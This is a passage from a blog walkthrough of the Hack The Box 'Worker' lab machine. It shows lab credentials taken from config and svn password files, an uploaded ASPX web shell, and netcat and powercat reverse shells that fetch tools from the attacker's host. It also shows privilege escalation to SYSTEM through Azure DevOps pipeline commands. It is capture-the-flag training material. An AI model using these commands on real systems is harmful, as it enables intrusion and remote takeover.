+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/worker/–force<span class="comment"># cat deploy.ps1 </span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;nathen&quot;</span> </span><br><span class="line"><span class="variable">$plain</span> = <span class="string">&quot;wendel98&quot;</span></span><br><span class="line"><span class="variable">$pwd</span> = (<span class="variable">$plain</span> | ConvertTo-SecureString)</span><br><span class="line"><span class="variable">$Credential</span> = New-Object System.Management.Automation.PSCredential <span class="variable">$user</span>, <span class="variable">$pwd</span></span><br><span class="line"><span class="variable">$args</span> = <span class="string">&quot;Copy-Site.ps1&quot;</span></span><br><span class="line">Start-Process powershell.exe -Credential <span class="variable">$Credential</span> -ArgumentList (<span class="string">&quot;-file <span class="variable">$args</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>username: nathen</p>
+</li>
+<li><p>password: wendel98</p>
+</li>
+</ul>
+<p>The only place where we could try credentials for now is</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://devops.worker.htb/</span><br></pre></td></tr></table></figure>
+
+<p>and we are logged in</p>
+<p>Turns out we can edit here all the sites that we discovered earlier on the dimensions page.</p>
+<p>since this a iis server we should be able now to create a reverse shell with asp or aspx.</p>
+<p>gonna use aspx reverseshell cmdasp.aspx to spawn a reverse shell:</p>
+<ul>
+<li>First we are gonna add a new branch:</li>
+</ul>
+<p>go to Repos then click on SmartHotel360 and change to alpha for example. (there are subdomain DNS rabbithole)</p>
+<ul>
+<li><p>Upload our aspx shell to our branch</p>
+</li>
+<li><p>create a new pull request</p>
+</li>
+<li><p>approve and complete pull request</p>
+</li>
+</ul>
+<p>then get a reverse shell</p>
+<p>now Add spectral.worker.htb to your &#x2F;etc&#x2F;hosts and connect to </p>
+<p>visit: <span class="exturl" data-url="aHR0cDovL3NwZWN0cmFsLndvcmtlci5odGIvY21kYXNwLmFzcHg=">http://spectral.worker.htb/cmdasp.aspx<i class="fa fa-external-link-alt"></i></span></p>
+<p>now our webshell is avalueable</p>
+<p>let’s make a reverse shell<br>on the webshell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> C:\temp</span><br></pre></td></tr></table></figure>
+<p>then</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="built_in">command</span> Invoke-WebRequest -Uri http://10.10.14.5:8001/nc64.exe -Outfile C:\\temp\\nc64.exe</span><br></pre></td></tr></table></figure>
+
+<p>then:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\temp\nc64.exe 10.10.14.5 4445 -e powershell.exe</span><br></pre></td></tr></table></figure>
+<p>on your local machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy nc64.exe <span class="keyword">in</span> worker directory</span><br></pre></td></tr></table></figure>
+<p>then</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8001</span><br></pre></td></tr></table></figure>
+<p>and on another terminal:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4445</span><br></pre></td></tr></table></figure>
+<p>now your connected as iis apppool\defaultapppool.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4445</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4445</span><br><span class="line">Ncat: Listening on 0.0.0.0:4445</span><br><span class="line">Ncat: Connection from 10.10.10.203.</span><br><span class="line">Ncat: Connection from 10.10.10.203:50819.</span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\windows\system32\inetsrv&gt; <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">iis apppool\defaultapppool</span><br></pre></td></tr></table></figure>
+
+<p>after running WinPEAs, we discover there is a w:\ drive<br>after some enumeration we find a password file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PS W:\svnrepos\www\conf&gt; <span class="built_in">type</span> passwd</span><br><span class="line"><span class="built_in">type</span> passwd</span><br><span class="line"><span class="comment">### This file is an example password file for svnserve.</span></span><br><span class="line"><span class="comment">### Its format is similar to that of svnserve.conf. As shown in the</span></span><br><span class="line"><span class="comment">### example below it contains one section labelled [users].</span></span><br><span class="line"><span class="comment">### The name and password for each user follow, one account per line.</span></span><br><span class="line"></span><br><span class="line">[<span class="built_in">users</span>]</span><br><span class="line">nathen = wendel98</span><br><span class="line">nichin = fqerfqerf</span><br><span class="line">nichin = asifhiefh</span><br><span class="line">noahip = player</span><br><span class="line">nuahip = wkjdnw</span><br><span class="line">oakhol = bxwdjhcue</span><br><span class="line">owehol = supersecret</span><br><span class="line">paihol = painfulcode</span><br><span class="line">parhol = gitcommit</span><br><span class="line">pathop = iliketomoveit</span><br><span class="line">pauhor = nowayjose</span><br><span class="line">payhos = icanjive</span><br><span class="line">perhou = elvisisalive</span><br><span class="line">peyhou = ineedvacation</span><br><span class="line">phihou = pokemon</span><br><span class="line">quehub = pickme</span><br><span class="line">quihud = kindasecure</span><br><span class="line">rachul = guesswho</span><br><span class="line">raehun = idontknow</span><br><span class="line">ramhun = thisis</span><br><span class="line">ranhut = getting</span><br><span class="line">rebhyd = rediculous</span><br><span class="line">reeinc = iagree</span><br><span class="line">reeing = tosomepoint</span><br><span class="line">reiing = isthisenough</span><br><span class="line">renipr = dummy</span><br><span class="line">rhiire = <span class="built_in">users</span></span><br><span class="line">riairv = canyou</span><br><span class="line">ricisa = seewhich</span><br><span class="line">robish = onesare</span><br><span class="line">robisl = wolves11</span><br><span class="line">robive = andwhich</span><br><span class="line">ronkay = onesare</span><br><span class="line">rubkei = the</span><br><span class="line">rupkel = sheeps</span><br><span class="line">ryakel = imtired</span><br><span class="line">sabken = drjones</span><br><span class="line">samken = aqua</span><br><span class="line">sapket = hamburger</span><br><span class="line">sarkil = friday</span><br></pre></td></tr></table></figure>
+
+<p>look at c:\users\ we see that robisl is a valid user on the box.<br>Getting a shell with robisl and get user:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># evil-winrm -i 10.10.10.203 -u robisl -p wolves11</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\robisl\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">worker\robisl</span><br><span class="line">*Evil-WinRM* PS C:\Users\robisl\Documents&gt; <span class="built_in">cd</span> ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\robisl\Desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\robisl\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        8/18/2020   5:47 PM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\robisl\Desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">8a5171122e56ad7a77aabbc239f14892</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb65.jpg"></li>
+</ul>
+<h3 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h3><p>after some enum, we can’t privesc to root with robisl, (or maybe there a way but didn’t find anything usefull)</p>
+<p>come back on the website devops.worker.htb and tryied to connect as robisl using wolves11 as password.</p>
+<p>We are connected ! </p>
+<p>And the repo isn’t the same but nothing really usefull inside it. (no password stored, etc…)</p>
+<ul>
+<li>But we can see we can create pipeline.</li>
+</ul>
+<p>create a basic project.</p>
+<p>go to pipeline, start one, then take Azure Repos git, select the basic default option (partunlimited)</p>
+<p>then pick “Starter pipeline” in the different project list.</p>
+<p>on the config script we can see we can execute command.<br>okay let’s see what’s we are:</p>
+<ul>
+<li>replace echo Hello, world by whoami.</li>
+</ul>
+<p>And remove the line:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool: <span class="string">&#x27;Default&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>because the server don’t have pool agent so the build will fail and we won’t have code execution.</p>
+<p>now it’s all good press Save and run and let’s wait the build finish.</p>
+<p>when looking at the log (script log) , we can see we run as</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##[section]Starting: Run a one-line script</span></span><br><span class="line">==============================================================================</span><br><span class="line">Task         : Command line</span><br><span class="line">Description  : Run a <span class="built_in">command</span> line script using Bash on Linux and macOS and cmd.exe on Windows</span><br><span class="line">Version      : 2.151.1</span><br><span class="line">Author       : Microsoft Corporation</span><br><span class="line">Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line</span><br><span class="line">==============================================================================</span><br><span class="line">Generating script.</span><br><span class="line">Script contents:</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">========================== Starting Command Output ===========================</span><br><span class="line"><span class="comment">##[command]&quot;C:\Windows\system32\cmd.exe&quot; /D /E:ON /V:OFF /S /C &quot;CALL &quot;w:\agents\agent11\_work\_temp\b1a4ec90-9e94-4e5f-9074-a565cefb9956.cmd&quot;&quot;</span></span><br><span class="line">nt authority\system</span><br><span class="line"><span class="comment">##[section]Finishing: Run a one-line script</span></span><br></pre></td></tr></table></figure>
+
+<p>We run the code execution as root!!!</p>
+<p>just create another pipeline and change script command to</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+
+<p>and we got the root flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##[section]Starting: Run a one-line script</span></span><br><span class="line">==============================================================================</span><br><span class="line">Task         : Command line</span><br><span class="line">Description  : Run a <span class="built_in">command</span> line script using Bash on Linux and macOS and cmd.exe on Windows</span><br><span class="line">Version      : 2.151.1</span><br><span class="line">Author       : Microsoft Corporation</span><br><span class="line">Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line</span><br><span class="line">==============================================================================</span><br><span class="line">Generating script.</span><br><span class="line">Script contents:</span><br><span class="line"><span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">========================== Starting Command Output ===========================</span><br><span class="line"><span class="comment">##[command]&quot;C:\Windows\system32\cmd.exe&quot; /D /E:ON /V:OFF /S /C &quot;CALL &quot;w:\agents\agent11\_work\_temp\389e4fa6-cf26-41d6-9dc5-7d09979f7b00.cmd&quot;&quot;</span></span><br><span class="line">43ebb4cb30276f0c2e77511c1d5b69d4</span><br><span class="line"><span class="comment">##[section]Finishing: Run a one-line script</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb66.jpg"></li>
+</ul>
+<p>this is a ctf,we can stop at here now.</p>
+<p>or add a reverse shell command if you want to connect to your local machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://10.10.14.5/powercat.ps1&#x27;);powercat -c 10.10.14.5 -p 3344 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0">powercat github download<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>on attack machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p>then run it, we will get a reverse shell</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb67.jpg"></li>
+</ul>
+<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
+<li>enumerate svn service</li>
+<li>credentials disclosure</li>
+<li>azure devops getshell</li>
+<li>powershell download files</li>
+<li>WinPEAs usage</li>
+<li>azure devops create pipeline then get command excecution</li>
+</ul>
+<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/08/18/worker/" title="Hack-The-Box-walkthrough[worker]">https://fdlucifer.github.io/2020/08/18/worker/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/08/17/Unbalanced/" rel="prev" title="Hack-The-Box-walkthrough[Unbalanced]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Unbalanced]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/08/19/laser/" rel="next" title="Hack-The-Box-walkthrough[laser]">
+                  Hack-The-Box-walkthrough[laser] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
